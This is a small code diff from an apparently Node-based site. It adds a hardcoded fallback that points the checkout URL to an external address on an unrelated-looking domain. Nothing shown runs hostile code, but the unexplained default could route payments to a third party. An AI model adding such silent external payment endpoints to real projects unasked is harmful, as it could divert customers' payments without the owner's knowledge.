@@ -26,6 +26,7 @@ for (const asset of fs.readdirSync(path.join(__dirname, "assets"), { withFileTyp
   }
 }
 
+process.env.MANGOFY_CHECKOUT_URL ??= "https://arvoredenatal.repousotiamarlene.online/vlixx62";
 const checkout = import("./api/checkout.mjs");
 
 function parseRange(header, size) {
